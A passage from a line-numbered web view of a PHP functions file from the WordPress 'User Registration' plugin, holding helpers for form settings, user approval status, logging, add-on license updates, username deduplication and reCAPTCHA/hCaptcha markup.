| [1188](#L1188) | function ur\_get\_approval\_default( $form\_id ) { |
| [1189](#L1189) | if ( isset( $form\_id ) && 0 != absint( $form\_id ) ) { |
| [1190](#L1190) | $value = ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_form\_setting\_enable\_email\_approval' ); |
| [1191](#L1191) | } else { |
| [1192](#L1192) | $value = ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_form\_setting\_enable\_email\_approval', get\_option( 'user\_registration\_login\_option\_enable\_email\_approval', false ) ); |
| [1193](#L1193) | } |
| [1194](#L1194) | $value = ur\_string\_to\_bool( $value ) ? true : false; |
| [1195](#L1195) |  |
| [1196](#L1196) | return $value; |
| [1197](#L1197) | } |
| [1198](#L1198) |  |
| [1199](#L1199) | /\*\* |
| [1200](#L1200) | \* Get Post meta value by meta key. |
| [1201](#L1201) | \* |
| [1202](#L1202) | \* @param int    $post\_id Post ID. |
| [1203](#L1203) | \* @param string $meta\_key Meta Key. |
| [1204](#L1204) | \* @param mixed  $default Default Value. |
| [1205](#L1205) | \* |
| [1206](#L1206) | \* @since 1.0.1 |
| [1207](#L1207) | \* |
| [1208](#L1208) | \* @return mixed |
| [1209](#L1209) | \*/ |
| [1210](#L1210) | function ur\_get\_single\_post\_meta( $post\_id, $meta\_key, $default = null ) { |
| [1211](#L1211) |  |
| [1212](#L1212) | $post\_meta = get\_post\_meta( $post\_id, $meta\_key ); |
| [1213](#L1213) |  |
| [1214](#L1214) | if ( isset( $post\_meta[0] ) ) { |
| [1215](#L1215) | if ( 'user\_registration\_form\_setting\_enable\_recaptcha\_support' === $meta\_key || 'user\_registration\_form\_setting\_enable\_strong\_password' === $meta\_key |
| [1216](#L1216) | || 'user\_registration\_pdf\_submission\_to\_admin' === $meta\_key || 'user\_registration\_pdf\_submission\_to\_user' === $meta\_key || 'user\_registration\_form\_setting\_enable\_assign\_user\_role\_conditionally' === $meta\_key ) { |
| [1217](#L1217) | $post\_meta[0] = ur\_string\_to\_bool( $post\_meta[0] ); |
| [1218](#L1218) | } |
| [1219](#L1219) | return $post\_meta[0]; |
| [1220](#L1220) | } |
| [1221](#L1221) |  |
| [1222](#L1222) | return $default; |
| [1223](#L1223) | } |
| [1224](#L1224) |  |
| [1225](#L1225) | /\*\* |
| [1226](#L1226) | \* Get general form settings by meta key (settings id). |
| [1227](#L1227) | \* |
| [1228](#L1228) | \* @param int    $form\_id Form ID. |
| [1229](#L1229) | \* @param string $meta\_key Meta Key. |
| [1230](#L1230) | \* @param mixed  $default Default Value. |
| [1231](#L1231) | \* |
| [1232](#L1232) | \* @since 1.0.1 |
| [1233](#L1233) | \* |
| [1234](#L1234) | \* @return mixed |
| [1235](#L1235) | \*/ |
| [1236](#L1236) | function ur\_get\_form\_setting\_by\_key( $form\_id, $meta\_key, $default = '' ) { |
| [1237](#L1237) |  |
| [1238](#L1238) | $fields = ur\_admin\_form\_settings\_fields( $form\_id ); |
| [1239](#L1239) | $value  = ''; |
| [1240](#L1240) |  |
| [1241](#L1241) | foreach ( $fields as $field ) { |
| [1242](#L1242) |  |
| [1243](#L1243) | if ( isset( $field['id'] ) && $meta\_key == $field['id'] ) { |
| [1244](#L1244) | $value = isset( $field['default'] ) ? sanitize\_text\_field( $field['default'] ) : $default; |
| [1245](#L1245) | break; |
| [1246](#L1246) | } |
| [1247](#L1247) | } |
| [1248](#L1248) |  |
| [1249](#L1249) | return $value; |
| [1250](#L1250) | } |
| [1251](#L1251) |  |
| [1252](#L1252) | /\*\* |
| [1253](#L1253) | \* Get user status in case of admin approval login option |
| [1254](#L1254) | \* |
| [1255](#L1255) | \* @param int $user\_id User ID. |
| [1256](#L1256) | \* @return int |
| [1257](#L1257) | \*/ |
| [1258](#L1258) | function ur\_get\_user\_approval\_status( $user\_id ) { |
| [1259](#L1259) |  |
| [1260](#L1260) | $user\_status = 1; |
| [1261](#L1261) |  |
| [1262](#L1262) | $form\_id = ur\_get\_form\_id\_by\_userid( $user\_id ); |
| [1263](#L1263) |  |
| [1264](#L1264) | $login\_option = ur\_get\_single\_post\_meta( $form\_id, 'user\_registration\_form\_setting\_login\_options', get\_option( 'user\_registration\_general\_setting\_login\_options', 'default' ) ); |
| [1265](#L1265) |  |
| [1266](#L1266) | if ( 'admin\_approval' === $login\_option ) { |
| [1267](#L1267) |  |
| [1268](#L1268) | $user\_status = get\_user\_meta( $user\_id, 'ur\_user\_status', true ); |
| [1269](#L1269) | } |
| [1270](#L1270) |  |
| [1271](#L1271) | return $user\_status; |
| [1272](#L1272) | } |
| [1273](#L1273) |  |
| [1274](#L1274) | /\*\* |
| [1275](#L1275) | \* Get form data by field key. |
| [1276](#L1276) | \* |
| [1277](#L1277) | \* @param array  $form\_data Form Data. |
| [1278](#L1278) | \* @param string $key Field Key. |
| [1279](#L1279) | \* |
| [1280](#L1280) | \* @return array |
| [1281](#L1281) | \*/ |
| [1282](#L1282) | function ur\_get\_form\_data\_by\_key( $form\_data, $key = null ) { |
| [1283](#L1283) |  |
| [1284](#L1284) | $form\_data\_array = array(); |
| [1285](#L1285) |  |
| [1286](#L1286) | foreach ( $form\_data as $data ) { |
| [1287](#L1287) | foreach ( $data as $single\_data ) { |
| [1288](#L1288) | foreach ( $single\_data as $field\_data ) { |
| [1289](#L1289) |  |
| [1290](#L1290) | $field\_key = isset( $field\_data->field\_key ) && null !== $field\_data->field\_key ? $field\_data->field\_key : ''; |
| [1291](#L1291) |  |
| [1292](#L1292) | if ( ! empty( $field\_key ) ) { |
| [1293](#L1293) | $field\_name = isset( $field\_data->general\_setting->field\_name ) && null !== $field\_data->general\_setting->field\_name ? $field\_data->general\_setting->field\_name : ''; |
| [1294](#L1294) |  |
| [1295](#L1295) | if ( null === $key ) { |
| [1296](#L1296) |  |
| [1297](#L1297) | if ( ! empty( $field\_name ) ) { |
| [1298](#L1298) | $form\_data\_array[ $field\_name ] = $field\_data; |
| [1299](#L1299) | } else { |
| [1300](#L1300) | $form\_data\_array[] = $field\_data; |
| [1301](#L1301) | } |
| [1302](#L1302) | } else { |
| [1303](#L1303) |  |
| [1304](#L1304) | if ( $field\_key === $key ) { |
| [1305](#L1305) |  |
| [1306](#L1306) | if ( ! empty( $field\_name ) ) { |
| [1307](#L1307) | $form\_data\_array[ $field\_name ] = $field\_data; |
| [1308](#L1308) | } else { |
| [1309](#L1309) | $form\_data\_array[] = $field\_data; |
| [1310](#L1310) | } |
| [1311](#L1311) | } |
| [1312](#L1312) | } |
| [1313](#L1313) | } |
| [1314](#L1314) | } |
| [1315](#L1315) | } |
| [1316](#L1316) | } |
| [1317](#L1317) |  |
| [1318](#L1318) | return $form\_data\_array; |
| [1319](#L1319) | } |
| [1320](#L1320) |  |
| [1321](#L1321) | /\*\* |
| [1322](#L1322) | \* Get a log file path. |
| [1323](#L1323) | \* |
| [1324](#L1324) | \* @since 1.0.5 |
| [1325](#L1325) | \* |
| [1326](#L1326) | \* @param string $handle name. |
| [1327](#L1327) | \* |
| [1328](#L1328) | \* @return string the log file path. |
| [1329](#L1329) | \*/ |
| [1330](#L1330) | function ur\_get\_log\_file\_path( $handle ) { |
| [1331](#L1331) | return UR\_Log\_Handler\_File::get\_log\_file\_path( $handle ); |
| [1332](#L1332) | } |
| [1333](#L1333) |  |
| [1334](#L1334) | /\*\* |
| [1335](#L1335) | \* Registers the default log handler. |
| [1336](#L1336) | \* |
| [1337](#L1337) | \* @since 1.0.5 |
| [1338](#L1338) | \* |
| [1339](#L1339) | \* @param array $handlers Log handlers. |
| [1340](#L1340) | \* |
| [1341](#L1341) | \* @return array |
| [1342](#L1342) | \*/ |
| [1343](#L1343) | function ur\_register\_default\_log\_handler( $handlers ) { |
| [1344](#L1344) |  |
| [1345](#L1345) | if ( defined( 'UR\_LOG\_HANDLER' ) && class\_exists( UR\_LOG\_HANDLER ) ) { |
| [1346](#L1346) | $handler\_class   = UR\_LOG\_HANDLER; |
| [1347](#L1347) | $default\_handler = new $handler\_class(); |
| [1348](#L1348) | } else { |
| [1349](#L1349) | $default\_handler = new UR\_Log\_Handler\_File(); |
| [1350](#L1350) | } |
| [1351](#L1351) |  |
| [1352](#L1352) | array\_push( $handlers, $default\_handler ); |
| [1353](#L1353) |  |
| [1354](#L1354) | return $handlers; |
| [1355](#L1355) | } |
| [1356](#L1356) |  |
| [1357](#L1357) | add\_filter( 'user\_registration\_register\_log\_handlers', 'ur\_register\_default\_log\_handler' ); |
| [1358](#L1358) |  |
| [1359](#L1359) |  |
| [1360](#L1360) | /\*\* |
| [1361](#L1361) | \* Get a shared logger instance. |
| [1362](#L1362) | \* |
| [1363](#L1363) | \* Use the user\_registration\_logging\_class filter to change the logging class. You may provide one of the following: |
| [1364](#L1364) | \*     - a class name which will be instantiated as `new $class` with no arguments |
| [1365](#L1365) | \*     - an instance which will be used directly as the logger |
| [1366](#L1366) | \* In either case, the class or instance \*must\* implement UR\_Logger\_Interface. |
| [1367](#L1367) | \* |
| [1368](#L1368) | \* @see UR\_Logger\_Interface |
| [1369](#L1369) | \* @since 1.1.0 |
| [1370](#L1370) | \* @return UR\_Logger |
| [1371](#L1371) | \*/ |
| [1372](#L1372) | function ur\_get\_logger() { |
| [1373](#L1373) | static $logger = null; |
| [1374](#L1374) | if ( null === $logger ) { |
| [1375](#L1375) | $class      = apply\_filters( 'user\_registration\_logging\_class', 'UR\_Logger' ); |
| [1376](#L1376) | $implements = class\_implements( $class ); |
| [1377](#L1377) | if ( is\_array( $implements ) && in\_array( 'UR\_Logger\_Interface', $implements ) ) { |
| [1378](#L1378) | if ( is\_object( $class ) ) { |
| [1379](#L1379) | $logger = $class; |
| [1380](#L1380) | } else { |
| [1381](#L1381) | $logger = new $class(); |
| [1382](#L1382) | } |
| [1383](#L1383) | } else { |
| [1384](#L1384) | ur\_doing\_it\_wrong( |
| [1385](#L1385) | \_\_FUNCTION\_\_, |
| [1386](#L1386) | sprintf( |
| [1387](#L1387) | /\* translators: %s: Class \*/ |
| [1388](#L1388) | \_\_( 'The class <code>%s</code> provided by user\_registration\_logging\_class filter must implement <code>UR\_Logger\_Interface</code>.', 'user-registration' ), |
| [1389](#L1389) | esc\_html( is\_object( $class ) ? get\_class( $class ) : $class ) |
| [1390](#L1390) | ), |
| [1391](#L1391) | '1.0.5' |
| [1392](#L1392) | ); |
| [1393](#L1393) | $logger = new UR\_Logger(); |
| [1394](#L1394) | } |
| [1395](#L1395) | } |
| [1396](#L1396) |  |
| [1397](#L1397) | return $logger; |
| [1398](#L1398) | } |
| [1399](#L1399) |  |
| [1400](#L1400) | /\*\* |
| [1401](#L1401) | \* Handles addon plugin updater. |
| [1402](#L1402) | \* |
| [1403](#L1403) | \* @param string $file Plugin File. |
| [1404](#L1404) | \* @param int    $item\_id Item ID. |
| [1405](#L1405) | \* @param string $addon\_version Addon Version. |
| [1406](#L1406) | \* @param bool   $beta Is beta version. |
| [1407](#L1407) | \* |
| [1408](#L1408) | \* @since 1.1.0 |
| [1409](#L1409) | \*/ |
| [1410](#L1410) | function ur\_addon\_updater( $file, $item\_id, $addon\_version, $beta = false ) { |
| [1411](#L1411) | $api\_endpoint = 'https://wpeverest.com/edd-sl-api/'; |
| [1412](#L1412) | $license\_key  = trim( get\_option( 'user-registration\_license\_key' ) ); |
| [1413](#L1413) | if ( class\_exists( 'UR\_AddOn\_Updater' ) ) { |
| [1414](#L1414) | new UR\_AddOn\_Updater( |
| [1415](#L1415) | esc\_url\_raw( $api\_endpoint ), |
| [1416](#L1416) | $file, |
| [1417](#L1417) | array( |
| [1418](#L1418) | 'version' => $addon\_version, |
| [1419](#L1419) | 'license' => $license\_key, |
| [1420](#L1420) | 'item\_id' => $item\_id, |
| [1421](#L1421) | 'author'  => 'WPEverest', |
| [1422](#L1422) | 'url'     => home\_url(), |
| [1423](#L1423) | 'beta'    => $beta, |
| [1424](#L1424) | ) |
| [1425](#L1425) | ); |
| [1426](#L1426) | } |
| [1427](#L1427) | } |
| [1428](#L1428) |  |
| [1429](#L1429) | /\*\* |
| [1430](#L1430) | \* Check if username already exists in case of optional username |
| [1431](#L1431) | \* And while stripping through email address and incremet last number by 1. |
| [1432](#L1432) | \* |
| [1433](#L1433) | \* @param  string $username Username. |
| [1434](#L1434) | \* @return string |
| [1435](#L1435) | \*/ |
| [1436](#L1436) | function check\_username( $username ) { |
| [1437](#L1437) |  |
| [1438](#L1438) | if ( username\_exists( $username ) ) { |
| [1439](#L1439) | preg\_match\_all( '/\d+$/m', $username, $matches ); |
| [1440](#L1440) |  |
| [1441](#L1441) | if ( isset( $matches[0][0] ) ) { |
| [1442](#L1442) | $last\_char       = $matches[0][0]; |
| [1443](#L1443) | $strip\_last\_char = substr( $username, 0, -( strlen( (string) $last\_char ) ) ); |
| [1444](#L1444) | $last\_char++; |
| [1445](#L1445) | $username = $strip\_last\_char . $last\_char; |
| [1446](#L1446) | $username = check\_username( $username ); |
| [1447](#L1447) |  |
| [1448](#L1448) | return $username; |
| [1449](#L1449) | } else { |
| [1450](#L1450) | $username = $username . '\_1'; |
| [1451](#L1451) | $username = check\_username( $username ); |
| [1452](#L1452) |  |
| [1453](#L1453) | return $username; |
| [1454](#L1454) | } |
| [1455](#L1455) | } |
| [1456](#L1456) |  |
| [1457](#L1457) | return $username; |
| [1458](#L1458) | } |
| [1459](#L1459) |  |
| [1460](#L1460) | /\*\* |
| [1461](#L1461) | \* Get all user registration forms title with respective id. |
| [1462](#L1462) | \* |
| [1463](#L1463) | \* @param int $post\_count Post Count. |
| [1464](#L1464) | \* @return array |
| [1465](#L1465) | \*/ |
| [1466](#L1466) | function ur\_get\_all\_user\_registration\_form( $post\_count = -1 ) { |
| [1467](#L1467) | $args        = array( |
| [1468](#L1468) | 'status'      => 'publish', |
| [1469](#L1469) | 'numberposts' => $post\_count, |
| [1470](#L1470) | 'order'       => 'ASC', |
| [1471](#L1471) | ); |
| [1472](#L1472) | $posts\_array = UR()->form->get\_form( '', $args ); |
| [1473](#L1473) | $all\_forms   = array(); |
| [1474](#L1474) |  |
| [1475](#L1475) | foreach ( $posts\_array as $post ) { |
| [1476](#L1476) | $all\_forms[ $post->ID ] = $post->post\_title; |
| [1477](#L1477) | } |
| [1478](#L1478) |  |
| [1479](#L1479) | return $all\_forms; |
| [1480](#L1480) | } |
| [1481](#L1481) |  |
| [1482](#L1482) | /\*\* |
| [1483](#L1483) | \* Checks user login option, if not email confirmation force not disable emails. |
| [1484](#L1484) | \*/ |
| [1485](#L1485) | function ur\_get\_user\_login\_option() { |
| [1486](#L1486) |  |
| [1487](#L1487) | if ( 'email\_confirmation' !== get\_option( 'user\_registration\_general\_setting\_login\_options' ) ) { |
| [1488](#L1488) | return array( |
| [1489](#L1489) | 'title'    => \_\_( 'Disable emails', 'user-registration' ), |
| [1490](#L1490) | 'desc'     => \_\_( 'Disable all emails sent after registration.', 'user-registration' ), |
| [1491](#L1491) | 'id'       => 'user\_registration\_email\_setting\_disable\_email', |
| [1492](#L1492) | 'default'  => 'no', |
| [1493](#L1493) | 'type'     => 'toggle', |
| [1494](#L1494) | 'autoload' => false, |
| [1495](#L1495) | ); |
| [1496](#L1496) | } else { |
| [1497](#L1497) | update\_option( 'user\_registration\_email\_setting\_disable\_email', false ); |
| [1498](#L1498) | } |
| [1499](#L1499) | } |
| [1500](#L1500) |  |
| [1501](#L1501) | /\*\* |
| [1502](#L1502) | \* Get the node to display google reCaptcha |
| [1503](#L1503) | \* |
| [1504](#L1504) | \* @param string $context Recaptcha context. |
| [1505](#L1505) | \* @param string $recaptcha\_enabled Is Recaptcha enabled. |
| [1506](#L1506) | \* @return string |
| [1507](#L1507) | \*/ |
| [1508](#L1508) | function ur\_get\_recaptcha\_node( $context, $recaptcha\_enabled = false ) { |
| [1509](#L1509) |  |
| [1510](#L1510) | $recaptcha\_type      = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_version', 'v2' ); |
| [1511](#L1511) | $invisible\_recaptcha = ur\_option\_checked( 'user\_registration\_captcha\_setting\_invisible\_recaptcha\_v2', false ); |
| [1512](#L1512) |  |
| [1513](#L1513) | if ( 'v2' === $recaptcha\_type && ! $invisible\_recaptcha ) { |
| [1514](#L1514) | $recaptcha\_site\_key    = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_key' ); |
| [1515](#L1515) | $recaptcha\_site\_secret = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret' ); |
| [1516](#L1516) | $enqueue\_script        = 'ur-google-recaptcha'; |
| [1517](#L1517) | } elseif ( 'v2' === $recaptcha\_type && $invisible\_recaptcha ) { |
| [1518](#L1518) | $recaptcha\_site\_key    = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_invisible\_site\_key' ); |
| [1519](#L1519) | $recaptcha\_site\_secret = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_invisible\_site\_secret' ); |
| [1520](#L1520) | $enqueue\_script        = 'ur-google-recaptcha'; |
| [1521](#L1521) | } elseif ( 'v3' === $recaptcha\_type ) { |
| [1522](#L1522) | $recaptcha\_site\_key    = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_key\_v3' ); |
| [1523](#L1523) | $recaptcha\_site\_secret = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret\_v3' ); |
| [1524](#L1524) | $enqueue\_script        = 'ur-google-recaptcha-v3'; |
| [1525](#L1525) | } elseif ( 'hCaptcha' === $recaptcha\_type ) { |
| [1526](#L1526) | $recaptcha\_site\_key    = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_key\_hcaptcha' ); |
| [1527](#L1527) | $recaptcha\_site\_secret = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret\_hcaptcha' ); |
| [1528](#L1528) | $enqueue\_script        = 'ur-recaptcha-hcaptcha'; |
| [1529](#L1529) | } |
| [1530](#L1530) | static $rc\_counter = 0; |
| [1531](#L1531) |  |
| [1532](#L1532) | if ( $recaptcha\_enabled ) { |
| [1533](#L1533) |  |
| [1534](#L1534) | if ( 0 === $rc\_counter ) { |
| [1535](#L1535) | wp\_enqueue\_script( 'ur-recaptcha' ); |
| [1536](#L1536) | wp\_enqueue\_script( $enqueue\_script ); |
| [1537](#L1537) |  |
| [1538](#L1538) | $ur\_google\_recaptcha\_code = array( |
| [1539](#L1539) | 'site\_key'          => $recaptcha\_site\_key, |
| [1540](#L1540) | 'is\_captcha\_enable' => true, |
| [1541](#L1541) | 'version'           => $recaptcha\_type, |
| [1542](#L1542) | 'is\_invisible'      => $invisible\_recaptcha, |
| [1543](#L1543) | ); |
| [1544](#L1544) |  |
| [1545](#L1545) | if ( function\_exists( 'wp\_is\_block\_theme' ) && wp\_is\_block\_theme() ) { |
| [1546](#L1546) | ?> |
| [1547](#L1547) | <script id="<?php echo esc\_attr( $enqueue\_script ); ?>"> |
| [1548](#L1548) | const ur\_recaptcha\_code = <?php echo wp\_json\_encode( $ur\_google\_recaptcha\_code ); ?> |
| [1549](#L1549) | </script> |
| [1550](#L1550) | <?php |
| [1551](#L1551) | } else { |
| [1552](#L1552) | wp\_localize\_script( $enqueue\_script, 'ur\_recaptcha\_code', $ur\_google\_recaptcha\_code ); |
| [1553](#L1553) | } |
| [1554](#L1554) | $rc\_counter++; |
| [1555](#L1555) | } |
| [1556](#L1556) |  |
| [1557](#L1557) | if ( 'v3' === $recaptcha\_type ) { |
| [1558](#L1558) | if ( 'login' === $context ) { |
| [1559](#L1559) | $recaptcha\_node = '<div id="node\_recaptcha\_login" class="g-recaptcha-v3" style="display:none"><textarea id="g-recaptcha-response" name="g-recaptcha-response" ></textarea></div>'; |
| [1560](#L1560) | } elseif ( 'register' === $context ) { |
| [1561](#L1561) | $recaptcha\_node = '<div id="node\_recaptcha\_register" class="g-recaptcha-v3" style="display:none"><textarea id="g-recaptcha-response" name="g-recaptcha-response" ></textarea></div>'; |
| [1562](#L1562) | } elseif ( 'lost\_password' === $context ) { |
| [1563](#L1563) | $recaptcha\_node = '<div id="node\_recaptcha\_lost\_password" class="g-recaptcha-v3" style="display:none"><textarea id="g-recaptcha-response" name="g-recaptcha-response" ></textarea></div>'; |
| [1564](#L1564) | } else { |
| [1565](#L1565) | $recaptcha\_node = ''; |
| [1566](#L1566) | } |
| [1567](#L1567) | } elseif ( 'hCaptcha' === $recaptcha\_type ) { |
| [1568](#L1568) |  |
| [1569](#L1569) | if ( 'login' === $context ) { |
| [1570](#L1570) | $recaptcha\_node = '<div id="node\_recaptcha\_login" class="g-recaptcha-hcaptcha"></div>'; |
| [1571](#L1571) |  |
| [1572](#L1572) | } elseif ( 'register' === $context ) { |
| [1573](#L1573) | $recaptcha\_node = '<div id="node\_recaptcha\_register" class="g-recaptcha-hcaptcha"></div>'; |
| [1574](#L1574) | } elseif ( 'lost\_password' === $context ) { |
| [1575](#L1575) | $recaptcha\_node = '<div id="node\_recaptcha\_lost\_password" class="g-recaptcha-hcaptcha"></div>'; |
| [1576](#L1576) | } else { |
| [1577](#L1577) | $recaptcha\_node = ''; |
| [1578](#L1578) | } |
| [1579](#L1579) | } else { |
| [1580](#L1580) | if ( 'v2' === $recaptcha\_type && $invisible\_recaptcha ) { |
| [1581](#L1581) | if ( 'login' === $context ) { |
| [1582](#L1582) | $recaptcha\_node = '<div id="node\_recaptcha\_login" class="g-recaptcha" data-size="invisible"></div>'; |
| [1583](#L1583) | } elseif ( 'register' === $context ) { |
| [1584](#L1584) | $recaptcha\_node = '<div id="node\_recaptcha\_register" class="g-recaptcha" data-size="invisible"></div>'; |
| [1585](#L1585) | } elseif ( 'lost\_password' === $context ) { |
| [1586](#L1586) | $recaptcha\_node = '<div id="node\_recaptcha\_lost\_password" class="g-recaptcha" data-size="invisible"></div>'; |
| [1587](#L1587) | } else { |
| [1588](#L1588) | $recaptcha\_node = ''; |
| [1589](#L1589) | } |
| [1590](#L1590) | } else { |
| [1591](#L1591) | if ( 'login' === $context ) { |
| [1592](#L1592) | $recaptcha\_node = '<div id="node\_recaptcha\_login" class="g-recaptcha"></div>'; |
| [1593](#L1593) |  |
| [1594](#L1594) | } elseif ( 'register' === $context ) { |
| [1595](#L1595) | $recaptcha\_node = '<div id="node\_recaptcha\_register" class="g-recaptcha"></div>'; |
| [1596](#L1596) | } elseif ( 'lost\_password' === $context ) { |
| [1597](#L1597) | $recaptcha\_node = '<div id="node\_recaptcha\_lost\_password" class="g-recaptcha"></div>'; |
| [1598](#L1598) | } else { |
| [1599](#L1599) | $recaptcha\_node = ''; |
| [1600](#L1600) | } |
| [1601](#L1601) | } |
| [1602](#L1602) | } |
| [1603](#L1603) | } else { |
| [1604](#L1604) | $recaptcha\_node = ''; |
| [1605](#L1605) | } |
| [1606](#L1606) |  |
| [1607](#L1607) | return $recaptcha\_node; |
| [1608](#L1608) | } |
| [1609](#L1609) |  |
| [1610](#L1610) | /\*\* |
| [1611](#L1611) | \* Get meta key label pair by form id |
| [1612](#L1612) | \* |
| [1613](#L1613) | \* @param  int $form\_id Form ID. |
| [1614](#L1614) | \* @since  1.5.0 |
| [1615](#L1615) | \* @return array |
| [1616](#L1616) | \*/ |
| [1617](#L1617) | function ur\_get\_meta\_key\_label( $form\_id ) { |
| [1618](#L1618) |  |
| [1619](#L1619) | $key\_label = array(); |
| [1620](#L1620) |  |
| [1621](#L1621) | $post\_content\_array = ( $form\_id ) ? UR()->form->get\_form( $form\_id, array( 'content\_only' => true ) ) : array(); |
| [1622](#L1622) |  |
| [1623](#L1623) | foreach ( $post\_content\_array as $post\_content\_row ) { |
| [1624](#L1624) | foreach ( $post\_content\_row as $post\_content\_grid ) { |
| [1625](#L1625) | foreach ( $post\_content\_grid as $field ) { |
| [1626](#L1626) | if ( isset( $field->field\_key ) && isset( $field->general\_setting->field\_name ) ) { |
| [1627](#L1627) | $key\_label[ $field->general\_setting->field\_name ] = $field->general\_setting->label; |
| [1628](#L1628) | } |
| [1629](#L1629) | } |
| [1630](#L1630) | } |
| [1631](#L1631) | } |
| [1632](#L1632) |  |
| [1633](#L1633) | return apply\_filters( 'user\_registration\_meta\_key\_label', $key\_label, $form\_id, $post\_content\_array ); |
| [1634](#L1634) | } |
| [1635](#L1635) |  |
| [1636](#L1636) | /\*\* |
| [1637](#L1637) | \* Get all user registration fields of the user by querying to database. |
| [1638](#L1638) | \* |
| [1639](#L1639) | \* @param  int $user\_id    User ID. |
| [1640](#L1640) | \* @since  1.5.0 |
| [1641](#L1641) | \* @return array |
| [1642](#L1642) | \*/ |
| [1643](#L1643) | function ur\_get\_user\_extra\_fields( $user\_id ) { |
| [1644](#L1644) | $name\_value = array(); |
| [1645](#L1645) |  |
| [1646](#L1646) | $admin\_profile = new UR\_Admin\_Profile(); |
| [1647](#L1647) | $extra\_data    = $admin\_profile->get\_user\_meta\_by\_form\_fields( $user\_id ); |
| [1648](#L1648) | $form\_fields   = isset( array\_column( $extra\_data, 'fields' )[0] ) ? array\_column( $extra\_data, 'fields' )[0] : array(); //phpcs:ignore |
| [1649](#L1649) | if ( ! empty( $form\_fields ) ) { |
| [1650](#L1650) | foreach ( $form\_fields as $field\_key => $field\_data ) { |
| [1651](#L1651) | $value     = get\_user\_meta( $user\_id, $field\_key, true ); |
| [1652](#L1652) | $field\_key = str\_replace( 'user\_registration\_', '', $field\_key ); |
| [1653](#L1653) |  |
| [1654](#L1654) | if ( is\_serialized( $value ) ) { |
| [1655](#L1655) | $value = unserialize( $value, array( 'allowed\_classes' => false ) ); //phpcs:ignore |
| [1656](#L1656) | $value = implode( ',', $value ); |
| [1657](#L1657) | } |
| [1658](#L1658) |  |
| [1659](#L1659) | $name\_value[ $field\_key ] = $value; |
| [1660](#L1660) |  |
| [1661](#L1661) | } |
| [1662](#L1662) | } |
| [1663](#L1663) |  |
| [1664](#L1664) | return apply\_filters( 'user\_registration\_user\_extra\_fields', $name\_value, $user\_id ); |
| [1665](#L1665) | } |
| [1666](#L1666) |  |
| [1667](#L1667) | /\*\* |
| [1668](#L1668) | \* Get User status like approved, pending. |
| [1669](#L1669) | \* |
| [1670](#L1670) | \* @param  string $user\_status Admin approval status of user. |
| [1671](#L1671) | \* @param  string $user\_email\_status Email confirmation status of user. |
| [1672](#L1672) | \*/ |
| [1673](#L1673) | function ur\_get\_user\_status( $user\_status, $user\_email\_status ) { |
| [1674](#L1674) | $status = array(); |
| [1675](#L1675) | if ( '0' === $user\_status || '0' === $user\_email\_status ) { |
| [1676](#L1676) | array\_push( $status, 'Pending' ); |
| [1677](#L1677) | } elseif ( '-1' === $user\_status || '-1' === $user\_email\_status ) { |
| [1678](#L1678) | array\_push( $status, 'Denied' ); |
| [1679](#L1679) | } else { |
| [1680](#L1680) | if ( $user\_email\_status ) { |
| [1681](#L1681) | array\_push( $status, 'Verified' ); |
| [1682](#L1682) | } else { |
| [1683](#L1683) | array\_push( $status, 'Approved' ); |
| [1684](#L1684) | } |
| [1685](#L1685) | } |
| [1686](#L1686) | return $status; |
| [1687](#L1687) | } |
| [1688](#L1688) |  |
| [1689](#L1689) | /\*\* |
| [1690](#L1690) | \* Get link for back button used on email settings. |
| [1691](#L1691) | \* |
| [1692](#L1692) | \* @param  string $label Label. |
| [1693](#L1693) | \* @param  string $url URL. |
| [1694](#L1694) | \*/ |
| [1695](#L1695) | function ur\_back\_link( $label, $url ) { |
| [1696](#L1696) | return '<small class="ur-admin-breadcrumb"><a href="' . esc\_url( $url ) . '" aria-label="' . esc\_attr( $label ) . '">&#x2934;</a></small>'; |
| [1697](#L1697) | } |
| [1698](#L1698) |  |
| [1699](#L1699) | /\*\* |
| [1700](#L1700) | \* The function wp\_doing ajax() is introduced in core @since 4.7, |
| [1701](#L1701) | \*/ |
| [1702](#L1702) | if ( ! function\_exists( 'wp\_doing\_ajax' ) ) { |
| [1703](#L1703) | /\*\* |
| [1704](#L1704) | \* Filters whether the current request is a WordPress Ajax request. |
| [1705](#L1705) | \*/ |
| [1706](#L1706) | function wp\_doing\_ajax() { |
| [1707](#L1707) | return apply\_filters( 'wp\_doing\_ajax', defined( 'DOING\_AJAX' ) && DOING\_AJAX ); |
| [1708](#L1708) | } |
| [1709](#L1709) | } |
| [1710](#L1710) |  |
| [1711](#L1711) | /\*\* |
| [1712](#L1712) | \* Checks if the string is json or not |
| [1713](#L1713) | \* |
| [1714](#L1714) | \* @param  string $str String to check. |
| [1715](#L1715) | \* @since  1.4.2 |
| [1716](#L1716) | \* @return mixed |
| [1717](#L1717) | \*/ |
| [1718](#L1718) | function ur\_is\_json( $str ) { |
| [1719](#L1719) | if ( ! is\_string( $str ) ) { |
| [1720](#L1720) | return false; |
| [1721](#L1721) | } |
| [1722](#L1722) |  |
| [1723](#L1723) | $json = json\_decode( $str ); |
| [1724](#L1724) | return $json && $str != $json && json\_last\_error() == JSON\_ERROR\_NONE; |
| [1725](#L1725) | } |
| [1726](#L1726) |  |
| [1727](#L1727) | /\*\* |
| [1728](#L1728) | \* Checks if the form contains a date field or not. |
| [1729](#L1729) | \* |
| [1730](#L1730) | \* @param  int $form\_id     Form ID. |
| [1731](#L1731) | \* @since  1.5.3 |
| [1732](#L1732) | \* @return boolean |
| [1733](#L1733) | \*/ |
| [1734](#L1734) | function ur\_has\_date\_field( $form\_id ) { |
| [1735](#L1735) |  |
| [1736](#L1736) | $post\_content\_array = ( $form\_id ) ? UR()->form->get\_form( $form\_id, array( 'content\_only' => true ) ) : array(); |
| [1737](#L1737) |  |
| [1738](#L1738) | if ( ! empty( $post\_content\_array ) ) { |
| [1739](#L1739) | foreach ( $post\_content\_array as $post\_content\_row ) { |
| [1740](#L1740) | foreach ( $post\_content\_row as $post\_content\_grid ) { |
| [1741](#L1741) | foreach ( $post\_content\_grid as $field ) { |
